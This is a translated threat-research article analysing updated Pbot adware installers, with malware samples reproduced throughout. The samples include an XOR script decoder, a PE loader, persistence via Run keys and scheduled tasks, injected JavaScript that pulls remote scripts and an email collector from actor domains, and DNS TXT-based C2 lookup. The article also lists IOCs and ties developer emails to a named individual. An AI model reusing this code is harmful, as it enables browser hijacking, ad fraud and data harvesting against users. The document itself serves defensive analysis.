<html>
<head>
<title>Not your same old adware anymore, PBOT updates</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">不再是你的旧广告软件，PBOT更新</h1>
<blockquote>原文：<a href="https://medium.com/walmartglobaltech/not-your-same-old-adware-anymore-pbot-updates-6d43b159ab35?source=collection_archive---------1-----------------------#2021-04-07">https://medium.com/walmartglobaltech/not-your-same-old-adware-anymore-pbot-updates-6d43b159ab35?source=collection_archive---------1-----------------------#2021-04-07</a></blockquote><div><div class="ds gv gw gx gy gz"/><div class="ha hb hc hd he"><div class=""/><figure class="ev ex if ig ih ii er es paragraph-image"><div role="button" tabindex="0" class="ij ik di il bf im"><div class="er es ie"><img src="../Images/fe058859af1b256bf7509523e51f55b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gkayMXPrQAiVyS9yvHlk6A.png"/></div></div></figure><p id="d433" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">广告软件在历史上一直被忽视，但多年来越来越多的参与者已经意识到浏览器扩展等东西实际上是一个僵尸网络。因此，什么使一个扩展恶意与否取决于谁在运行僵尸网络，然而这可以改变，因为人们可以购买一个流行的扩展的权利，然后加载他们想要的任何东西，接管一个开发者帐户，甚至只是开发自己的并随着时间的推移利用它们。</p><p id="f996" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">最近微软谈到了一个利用浏览器扩展和凭证窃取者的广告软件僵尸网络[4]，我也谈到了另一个作为安装程序分发的广告软件僵尸网络，它利用了同一个“Finder”窃取者[3]。在最近调查我们从两个僵尸网络中涉及的一个参与者转向的一些基础设施时，我们偶然发现了一些关于Pbot的有趣见解，Pbot是一个用于广告软件的python脚本和PE组件的系统，自Malwarebytes在2018年对其进行了出色的撰写以来，它没有发生太大变化[5]。</p><h1 id="86c7" class="jn jo hh bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">Pbot有什么新功能？</h1><p id="c078" class="pw-post-body-paragraph ip iq hh ir b is kl iu iv iw km iy iz ja kn jc jd je ko jg jh ji kp jk jl jm ha bi translated">如今，Pbot基本上还是老样子，但是他们现在利用NSIS的安装人员来安装他们的各种组件。</p><p id="9c43" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">“my_”的安装程序示例，不包括内置python:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="7ea7" class="kz jo hh kv b fi la lb l lc ld">filter.bin<br/>rules.ini<br/>settings.ini<br/>start.bin<br/>start.pyc<br/>js/example.js<br/>js/vd.js<br/>js/yt.js<br/>$INSTDIR_upd/Kodobi.exe<br/>$INSTDIR_upd/start.bin<br/>$INSTDIR_upd/start.pyc<br/>$PLUGINSDIR/nsExec.dll</span></pre><p id="9aa0" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">在对脚本进行解码和去模糊化之后，我们剩下的python脚本与Malwarebytes经历的非常相似。因此，我们将简单地强调一些额外的混淆。</p><p id="97ee" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">“start.pyc”负责加载、异或解码和执行“start.bin ”,这意味着“start.bin”也将是python代码。</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="9d0c" class="kz jo hh kv b fi la lb l lc ld">&gt;&gt;&gt; a = open('start.bin', 'rb').read()<br/>&gt;&gt;&gt; key = [119, 202, 9, 62, 242, 222, 133, 29, 119, 84, 152, 171, 160, 91, 146, 153, 126, 48]<br/>&gt;&gt;&gt; a = bytearray(a)<br/>&gt;&gt;&gt; for i in range(len(a)):<br/>...   a[i] ^= key[i%len(key)]<br/>...<br/>&gt;&gt;&gt; a<br/>bytearray(b'import zlib\r\nimport b</span></pre><p id="4c04" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">解码后的“start.bin”代码与Hasherzade在他们的Malwarebytes文章中详细描述的非常相似，该脚本负责在解码之前加载“filter.bin”文件:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="5240" class="kz jo hh kv b fi la lb l lc ld">HF = open('filter.bin', 'rb')<br/>C.GetVersion()<br/>Hx = HF.read()<br/>X.UnhookWindowsHookEx(414986859)<br/>HF.close()<br/>X.GetSubMenu(3554727512,876685492)<br/>HU = len(Hx)<br/>C.GetCommandLineA()<br/>X.RegisterHotKey(2993556035,767033726,1828451905,4004424231)<br/>HN = C.VirtualAlloc(0, 1748992, 4096, 64)</span></pre><p id="fb3f" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">解码将利用存储在base64 blob底部的list列表，然后加载期望PE文件的文件:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="ff12" class="kz jo hh kv b fi la lb l lc ld">if (d(hy) != 23117):<br/>    z('Not an MZ image!')<br/>cH = t((hy + s.cx.offset))<br/>cc = (hy + cH)<br/>if (t(cc) != 17744):<br/>    z('Not an PE image!')</span></pre><p id="e89b" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该脚本还负责安装持久性:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="74bf" class="kz jo hh kv b fi la lb l lc ld">def mainfn():<br/>    from time import time<br/>    from math import ceil<br/>    from sys import argv<br/>    from random import shuffle</span><span id="7e90" class="kz jo hh kv b fi le lb l lc ld">checkers=[chkStartUpLnk, chkRegRun, chkTask]<br/>    deleters=[delStartUpLnk, delRegRun, delTask]<br/>    healers=[setStartUpLnk, setRegRun, setTask]</span><span id="a964" class="kz jo hh kv b fi le lb l lc ld">if getattr(opts, "ACTION")=="default":<br/>        tm=0.0<br/>        if os.path.isfile('time.txt'):<br/>            f=open('time.txt')<br/>            tm=parseTime(f.read())<br/>            f.close()</span><span id="3f96" class="kz jo hh kv b fi le lb l lc ld">f=open('time.txt', 'w')<br/>        f.write(str(time()))<br/>        f.close()</span><span id="742d" class="kz jo hh kv b fi le lb l lc ld">if time()-tm&lt;63.0:<br/>            return</span><span id="3552" class="kz jo hh kv b fi le lb l lc ld">subprocess.Popen(launchCmd, creationflags=0x00000208)</span><span id="bf73" class="kz jo hh kv b fi le lb l lc ld">toHeal=[]</span><span id="10b3" class="kz jo hh kv b fi le lb l lc ld">for i in range(0, len(checkers)):<br/>            if not checkers[i]():<br/>                toHeal.append(healers[i])</span><span id="6da8" class="kz jo hh kv b fi le lb l lc ld">shuffle(toHeal)<br/>        nWorked = len(checkers)-len(toHeal)<br/>        minWorked=ceil(len(checkers)*0.5)<br/>        nHeal=max(minWorked-nWorked, 0)</span><span id="4c7a" class="kz jo hh kv b fi le lb l lc ld">for j in range(0, nHeal):<br/>            toHeal[j]()<br/>        return</span><span id="c7bc" class="kz jo hh kv b fi le lb l lc ld">if getattr(opts, "ACTION")=="inst":<br/>        for h in healers:<br/>            h()<br/>        return<br/>    if getattr(opts, "ACTION")=="uninst":<br/>        for d in deleters:<br/>            d()<br/>        return</span><span id="c2a6" class="kz jo hh kv b fi le lb l lc ld">mainfn()</span></pre><p id="f94d" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">其他一些文件与Malwarebytes文章一致，如rules.ini文件和settings.ini，安装程序还附带了一些javascript文件，这些文件与之前看到的其他一些广告软件bot活动有一些有趣的交叉。</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="0a50" class="kz jo hh kv b fi la lb l lc ld">!function () {<br/> if(window.location.href.indexOf('www.youtube.com') + 1 &amp;&amp; window.top == window) {<br/>  var script_old_new = document.createElement('script');<br/>   script_old_new.src = "https://in.levitatedpie.com/soft_yo.js";<br/>   script_old_new.async = false;<br/>   document.head.appendChild(script_old_new);<br/> } else {<br/>  if (document.location.href !== "https://www.youtube.com/embed/") {<br/>   if (window.top !== window) return<br/>   var new_yt_generic_div = document.createElement('div');<br/>    new_yt_generic_div.style = 'transform:  scale(0.01, 0.01)';<br/>    new_yt_generic_div.style.position = 'fixed';<br/>    new_yt_generic_div.style.left = '0px';<br/>    new_yt_generic_div.style.top = '0px';<br/>    new_yt_generic_div.style.width = '10px';<br/>    new_yt_generic_div.style.height = '10px';<br/>    new_yt_generic_div.style.opacity = '0.1';<br/>    new_yt_generic_div.style.overflow = 'hidden';<br/>   var frame = document.createElement('iframe');<br/>    frame.src = 'https://www.youtube.com/embed/';<br/>    frame.style.top= '0px';<br/>    frame.style.width = '730px';<br/>    frame.style.height = '490px';<br/>    new_yt_generic_div.appendChild(frame);<br/>    document.body.appendChild(new_yt_generic_div);<br/>  }</span><span id="438a" class="kz jo hh kv b fi le lb l lc ld">if (document.location.href === "https://www.youtube.com/embed/") {<br/>   var script_old_new = document.createElement('script');<br/>   script_old_new.src = "https://in.levitatedpie.com/soft_embed.js";<br/>   script_old_new.async = false;<br/>   document.head.appendChild(script_old_new);<br/>  }<br/> }<br/>}();</span></pre><p id="b775" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">也是一个将加载更多脚本的脚本:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="2fe2" class="kz jo hh kv b fi la lb l lc ld">if (document.documentElement.hasAttribute('new-advpp')) {<br/>            return;<br/>        }<br/>        document.documentElement.setAttribute('new-advpp', 'yes');</span><span id="402a" class="kz jo hh kv b fi le lb l lc ld">window['advppUserId'] = window.O7JFWNKS2FkEhGn3dFE;</span><span id="dbaa" class="kz jo hh kv b fi le lb l lc ld">var n = document.createElement('script');<br/>        n.src = '//api.ppfr52sx.xyz/common/module.js?streamId=TnpNPQ==';<br/>        document.body.appendChild(n);</span></pre><p id="f90c" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">脚本“module.js”将加载“union-module.js”:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="9292" class="kz jo hh kv b fi la lb l lc ld">this.apiUrl = '//api.ppgw3t5e.xyz/common/union-module.js';</span></pre><p id="a891" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">加载后续javascript文件的顺序会持续一段时间，有些似乎与执行广告欺诈和虚假点击有关，或者将更多脚本加载到不可见的iframes中:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="4f8a" class="kz jo hh kv b fi la lb l lc ld">var iframe = document.createElement('iframe');<br/>                iframe.name = "advpp_manager";<br/>                iframe.src = "//api.ppgw3t5e.xyz/common/cookie";<br/>                iframe.width = '0px';<br/>                iframe.height = '0px';<br/>                iframe.style.border = '0px';</span><span id="e6df" class="kz jo hh kv b fi le lb l lc ld">document.body.appendChild(iframe);</span></pre><p id="0378" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">其他一些跟踪变得相当深入:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="0914" class="kz jo hh kv b fi la lb l lc ld">UnionModule.manager.init()<br/>            .then(function () {<br/>                if (!CookiesModule.getCookie("___ml_clltr")) {<br/>                    new JsLoader('//api.ppgw3t5e.xyz/assets/javascripts/collect-emails.js', function () {<br/>                        collectEmail(UserModule.getUserId(), 'api.ppgw3t5e.xyz');<br/>                    });<br/>                }<br/>                return UnionModule.manager.readCookie("visits");<br/>            })</span></pre><p id="3aca" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">还提到了利用coinhive和一些通过regex解码的稍微模糊的字符串:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="2185" class="kz jo hh kv b fi la lb l lc ld">_ch: "Co" + '' + "in" + "" + 'Hi' + '' + 've',<br/>        _an: "An" + "" + "" + 'o' + '' + 'ny' + '' + 'mous',</span><span id="1bad" class="kz jo hh kv b fi le lb l lc ld">var cc = '345435C067586r0004y34p345t545o045J35670654S4512237789';<br/>var s = '4598A0000413E13S435665465465490890';<br/>var rd = '0974545d3455497e5468789c235r545646134y34565958p45654645t4564645124386543';</span><span id="8a4b" class="kz jo hh kv b fi le lb l lc ld">&gt;&gt;&gt; a = '345435C067586r0004y34p345t545o045J35670654S4512237789'<br/>&gt;&gt;&gt; [x for x in a if x not in '0123456789']<br/>['C', 'r', 'y', 'p', 't', 'o', 'J', 'S']<br/>&gt;&gt;&gt; a = '4598A0000413E13S435665465465490890'<br/>&gt;&gt;&gt; [x for x in a if x not in '0123456789']<br/>['A', 'E', 'S']<br/>&gt;&gt;&gt; a = '0974545d3455497e5468789c235r545646134y34565958p45654645t4564645124386543'<br/>&gt;&gt;&gt; [x for x in a if x not in '0123456789']<br/>['d', 'e', 'c', 'r', 'y', 'p', 't']</span></pre><p id="04b3" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">在这个NSIS安装程序里面是另一个NSIS安装程序，叫做Kodobi bundle。</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="93ce" class="kz jo hh kv b fi la lb l lc ld">load.bin<br/>load.pyc<br/>mjfnijmemjilopepdgnakgghiboempgf.crx<br/>$PLUGINSDIR/nsExec.dll</span></pre><p id="2d9f" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">在以与我们解码之前的“start.bin”文件相同的方式解码“load.bin”文件后，我们剩下一个具有板载配置数据的不同脚本:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="a2e7" class="kz jo hh kv b fi la lb l lc ld">cnf = json.loads("{\"suffix\": \"/my\", \"domain\": \"upd.oyl4b8zhi.life\"}")<br/>DOMAIN = cnf['domain']<br/>SUFFIX = cnf['suffix']</span></pre><p id="ad20" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">稍后在脚本中解析该域，以构建将用于通信的URL:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="b89e" class="kz jo hh kv b fi la lb l lc ld">resolver = dns.resolver.Resolver()<br/>    resolver.nameservers = ['8.8.8.8', '8.8.4.4']<br/>    answers = resolver.query(DOMAIN, 'TXT')<br/>    url = base64.b64decode(answers[0].strings[0]).decode("utf8") + SUFFIX</span></pre><p id="f4ac" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这里发生了一些有趣的事情，解析器正在寻找TXT记录，然后似乎期望一个BASE64编码的URL？</p><p id="f8c4" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">域“upd.oyl4b8zhi.life”的TXT记录设置为:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="8988" class="kz jo hh kv b fi la lb l lc ld">aHR0cDovL2VmcmNxd3Z2Lnh5ei91cGQ=</span></pre><p id="3e7c" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">解码:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="f66d" class="kz jo hh kv b fi la lb l lc ld">http://efrcqwvv[.]xyz/upd</span></pre><p id="311c" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">添加后缀后，我们将只剩下</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="63fc" class="kz jo hh kv b fi la lb l lc ld">http://efrcqwvv[.]xyz/upd/my</span></pre><p id="7dd4" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">从这些DNS TXT记录中可以看出这一点:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="da22" class="kz jo hh kv b fi la lb l lc ld">;; QUESTION SECTION:<br/>;upd.cdn-j4v2svnc.biz.  IN TXT</span><span id="746a" class="kz jo hh kv b fi le lb l lc ld">;; ANSWER SECTION:<br/>upd.cdn-j4v2svnc.biz. 3600 IN TXT "aHR0cDovL2VmdWphcW5yLnh5ei91cGQ="</span></pre><p id="ec0b" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">解码:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="87eb" class="kz jo hh kv b fi la lb l lc ld">http://efujaqnr[.]xyz/upd</span></pre><p id="f747" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">脚本对这些二级域做的第一件事是拉下一个config.json文件:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="5878" class="kz jo hh kv b fi la lb l lc ld">{"update":[{"from":"\/files\/rules.ini?","to":"rules.ini","sha1":"d401305618f85e63524cd7393a991d9e32d90b21"},{"from":"\/files\/example.js?","to":"js\\example.js","sha1":"5d4b2d97d2eff59e30c057ea89f435501bd6856a"},{"from":"\/files\/adjts.js?","to":"js\\adjts.js","sha1":"b645d640097f8ef4d95189ad01161c1520addfcf"}],"afterupdate":[]}</span></pre><p id="27a5" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这些来自config.json的文件告诉机器人它可以下载什么文件以及如何在本地存储它们，在这个包中还有一个Chrome扩展:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="a59a" class="kz jo hh kv b fi la lb l lc ld">  "background": {<br/>    "scripts": [<br/>      "background.js"<br/>    ],<br/>    "persistent": false<br/>  },</span><span id="6022" class="kz jo hh kv b fi le lb l lc ld">"browser_action": {<br/>    "default_title": "Kodobi"<br/>  },</span><span id="e325" class="kz jo hh kv b fi le lb l lc ld">"permissions": [<br/>    "<a class="ae lf" rel="noopener ugc nofollow" target="_blank" href="/*/*">http://*/*</a>",<br/>    "<a class="ae lf" rel="noopener ugc nofollow" target="_blank" href="/*/*">https://*/*</a>",<br/>    "storage",<br/>    "unlimitedStorage",<br/>    "tabs"<br/>  ],</span></pre><p id="4b6e" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">“background.js”文件将为许多不同的公司启动另一个广告加载链。</p><h1 id="c410" class="jn jo hh bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">在幕后，谁在运行Pbot？</h1><p id="85b9" class="pw-post-body-paragraph ip iq hh ir b is kl iu iv iw km iy iz ja kn jc jd je ko jg jh ji kp jk jl jm ha bi translated">这是Pbot更新的旋风之旅，DNS TXT记录非常有趣，我不确定Pbot背后的人是否理解这对于能够跟踪和追踪它们意味着什么。</p><p id="839b" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">让我们跳到构建器:</p><figure class="kq kr ks kt fd ii er es paragraph-image"><div class="er es lg"><img src="../Images/7ba14e7343a78c159f910b9526af060f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1304/format:webp/1*BIb3HdjUHxBXfyWBX7Nqsg.png"/></div></figure><p id="f937" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">files文件夹将包含每个附属机构的版本:</p><figure class="kq kr ks kt fd ii er es paragraph-image"><div class="er es lh"><img src="../Images/0de0dc3f57562be3061dea68e508bc57.png" data-original-src="https://miro.medium.com/v2/resize:fit:922/format:webp/1*Wm4j0MsN_r1INELPWwCy0g.png"/></div></figure><figure class="kq kr ks kt fd ii er es paragraph-image"><div class="er es li"><img src="../Images/6432c329fcdfa953624cfa8d0bcc3e38.png" data-original-src="https://miro.medium.com/v2/resize:fit:896/format:webp/1*rseQXgc6OCjSIWw22Rgkag.png"/></div></figure><p id="00c7" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">我试着尊重人们不被触碰的意愿，但这次我们破例了。</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="efdf" class="kz jo hh kv b fi la lb l lc ld">"id" INTEGER NOT NULL,<br/> "advppUrl" VARCHAR(255) NOT NULL,<br/> "metrikaId" VARCHAR(255) NOT NULL,<br/> "googleId" VARCHAR(255) NOT NULL,<br/> "googleId2" VARCHAR(255) NOT NULL,<br/> "updateServer" VARCHAR(255) NOT NULL,<br/> "updatePrefix" VARCHAR(255) NOT NULL,<br/> "exeFileName" VARCHAR(255) NOT NULL,<br/> "autoRebuild" BOOLEAN NOT NULL,<br/> "workingOnMailRu" BOOLEAN NOT NULL,<br/> "bundleExe" VARCHAR(255) NOT NULL,<br/> "bundleExeParams" VARCHAR(255) NOT NULL,<br/> "disableUninstall" BOOLEAN NOT NULL,<br/> "hideUninstall" BOOLEAN NOT NULL,<br/> "isEmptyRules" BOOLEAN NOT NULL,<br/> "emptyRulesTimeout" INTEGER NOT NULL,<br/> "hasKodobiBundle" BOOLEAN NOT NULL,<br/> "customName" VARCHAR(255),<br/> "certCustomName" VARCHAR(255),<br/> "addCertificate" VARCHAR(255), hasSearchBundle boolean NOT NULL default 0,</span><span id="5301" class="kz jo hh kv b fi le lb l lc ld">77|//api.pp5rfdsq.life/common/module.js?streamId=TWpFMA==<br/>80|//api.test.advpartners.org/common/module.js?streamId=TVRrMw==&amp;isAdvpp=true<br/>82|//api.test.advpartners.org/common/module.js?streamId=TVRrMw==&amp;isAdvpp=true<br/>83|//api.ppgw3t5e.xyz/common/module.js?streamId=TnpFPQ==<br/>84|//api.ppgw3t5e.xyz/common/module.js?streamId=TlRjPQ==<br/>85|//api.pptfhu11.biz/common/module.js?streamId=TlRRPQ==</span></pre><p id="793e" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">为“advpartners”的“测试”列出了有趣的站点。</p><figure class="kq kr ks kt fd ii er es paragraph-image"><div role="button" tabindex="0" class="ij ik di il bf im"><div class="er es lj"><img src="../Images/f7ec0cdf7a019ae27ba2a4d3513822cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*58Tio5cpkFzDV2-5sPmvyQ.png"/></div></div></figure><p id="702f" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">列为一个平台，以“货币化你的扩展”。有意思，但是是谁？</p><p id="eb29" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该项目托管在bitbucket上:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="2ab3" class="kz jo hh kv b fi la lb l lc ld">url = git@bitbucket.org:alexander-spesivtsev/webspark-build-runner.git</span></pre><p id="f516" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">用户Alexander Spesivtsev，我想这是一个假名，而不是俄罗斯连环杀手本人。第一次提交实际上是从“x <x>”开始的，这个人正在为构建器备份源代码:</x></p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="2ef0" class="kz jo hh kv b fi la lb l lc ld">Author: x &lt;x@x.x&gt;<br/>Date:   Tue Oct 16 07:18:20 2018 +0300</span><span id="664d" class="kz jo hh kv b fi le lb l lc ld">backup source of builder from windows server</span></pre><p id="77e3" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">几天后，当“Alexander Spesivtsev”出现时，意味着代码库可能在这个用户得到它之前已经从其他人那里获得了。</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="7f8e" class="kz jo hh kv b fi la lb l lc ld">Author: Alexandr Spesivtsev &lt;alexander.spesivtsev@local-internet.ru&gt;<br/>Date:   Thu Oct 18 12:10:35 2018 +0700</span><span id="fbd9" class="kz jo hh kv b fi le lb l lc ld">rewrite</span></pre><p id="5979" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">然而，除了那些明显伪造的名字之外，GIT日志中还有一些有趣的名字。</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="99b0" class="kz jo hh kv b fi la lb l lc ld">Author: Ruslan &lt;teacher@moy-yii2.ru&gt;<br/>Date:   Thu Dec 13 22:44:35 2018 +0500</span><span id="542b" class="kz jo hh kv b fi le lb l lc ld">- убрано сохранение в tmp_exe</span></pre><p id="f983" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">包括一个“Ruslan”在几年后使用同一个local-internet.ru域名的例子:</p><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="0888" class="kz jo hh kv b fi la lb l lc ld">Author: proger &lt;ruslan@local-internet.com&gt;<br/>Date:   Thu Oct 8 04:40:38 2020 -0700</span><span id="cfa7" class="kz jo hh kv b fi le lb l lc ld">- update</span></pre><p id="3296" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">那么谁是鲁斯兰？我能找到的与这个名字的唯一联系是老师的电子邮件，其中显示一个Ruslan个人作为Moy-yii2在Spark上的代表，Spark是RU的一个创业公司列表。值得注意的是，我们不能确认这是否是GIT提交中列出的人，因为它很可能是使用此人姓名的人，因为数据可以跟踪到看起来是真实的人，我们编辑了大多数信息，除了可以从GIT提交中直接引用的数据。</p><figure class="kq kr ks kt fd ii er es paragraph-image"><div role="button" tabindex="0" class="ij ik di il bf im"><div class="er es lk"><img src="../Images/c2876661ca7b300a991596d4bb0d99db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qV7F_a0sfW1VxRsF8qnAEQ.jpeg"/></div></div><figcaption class="ll lm et er es ln lo bd b be z dx">Credit: Spark.ru</figcaption></figure><h1 id="6237" class="jn jo hh bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">IOCs</h1><pre class="kq kr ks kt fd ku kv kw kx aw ky bi"><span id="c7d5" class="kz jo hh kv b fi la lb l lc ld">winpatchz.net<br/>upd.cdn-j4v2svnc.biz<br/>metds.net<br/>efujaqnr.xyz<br/>bestlivestat.com<br/>efrcqwvv.xyz<br/>oyl4b8zhi.life<br/>efkbt6yy.biz<br/>efounkpq.xyz<br/>efzdeesa.xyz<br/>advpartners.org<br/>lipartners.ru<br/>pp71r6ff.biz<br/>ppaok2j3.xyz<br/>ppard4g4.biz<br/>ppc9o8fa.biz<br/>ppdczpt6.biz<br/>ppddsn6v.biz<br/>ppdmi9oo.xyz<br/>ppdxv69j.biz<br/>ppevpl8u.xyz<br/>ppfbe3ws.xyz<br/>ppfd3c6h.xyz<br/>ppfd6tbn.xyz<br/>ppfercza.xyz<br/>ppfr52sx.xyz<br/>ppfrbaai.xyz<br/>ppfrqamm.xyz<br/>ppfsz5t5.xyz<br/>ppgbtedd.biz<br/>ppgczn65.xyz<br/>ppgdwqqc.xyz<br/>ppggfe2w.biz<br/>ppgrfcc4.xyz<br/>ppgw3t5e.xyz<br/>pphb5dpz.xyz<br/>pphgecv2.xyz<br/>ppht4edv.xyz<br/>ppijklp9.biz<br/>ppijrfs9.xyz<br/>ppirqvik.xyz<br/>ppiy66dq.biz<br/>ppjbsasc.biz<br/>ppju76rf.xyz<br/>pplfvseq.biz<br/>ppln51fv.biz<br/>ppnb2ap8.xyz<br/>ppnmygkk.xyz<br/>ppogpyz3.biz<br/>ppoin2ws.xyz<br/>ppqoi1b2.biz<br/>pprfkk87.biz<br/>pprum43y.biz<br/>ppsbb4kj8.xyz<br/>ppsqvgzj.xyz<br/>pptfdalp.biz<br/>pptfhu11.biz<br/>pptfqxxs.biz<br/>pptgvfrr.xyz<br/>pptvpo9i.xyz<br/>ppube3iy.xyz<br/>ppubfefr.biz<br/>ppubh2fc.biz<br/>ppunppqa.xyz<br/>pputjqyy.biz<br/>ppuyvccj.biz<br/>ppvpmk5q.xyz<br/>ppwoyj98.biz<br/>ppyvbv32.biz<br/>ppyvoa6t.biz<br/>ppyvzz8u.biz<br/>rdhveq19.biz<br/>rdpjyg3z.biz<br/>ws-test.pw<br/>cdn-j4v2svnc.biz</span></pre><h1 id="9063" class="jn jo hh bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">参考</h1><p id="afc6" class="pw-post-body-paragraph ip iq hh ir b is kl iu iv iw km iy iz ja kn jc jd je ko jg jh ji kp jk jl jm ha bi translated">1:<a class="ae lf" 